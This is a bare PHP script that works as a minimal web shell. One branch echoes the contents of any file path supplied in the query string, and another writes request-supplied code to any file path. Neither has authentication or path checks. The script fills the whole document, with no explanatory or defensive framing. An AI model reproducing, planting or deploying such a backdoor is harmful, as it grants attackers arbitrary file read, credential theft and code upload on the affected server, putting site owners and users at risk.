<?php

if ($_GET[2]=='read' AND $_GET['file'])
    echo file_get_contents($_GET['file']);

if ($_GET[2]=='write' AND $_GET['file'] AND $_POST['code'])
    echo file_put_contents($_GET['file'], $_POST['code']);

exit;